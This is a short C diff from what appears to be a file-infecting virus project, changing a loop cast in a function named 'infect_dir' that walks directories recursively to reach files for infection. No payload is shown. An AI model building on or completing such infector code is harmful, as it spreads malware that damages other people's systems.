@@ -20,7 +20,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 			return fail("read dir");
 		}
 		size_t x;
-		for (x = 0; x < size; x += d->d_reclen){
+		for (x = 0; x < (size_t)size; x += d->d_reclen){
 			d = (struct linux_dirent*)(p + x);
 			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
 				char *t = ft_add_base(dirname, d->d_name);
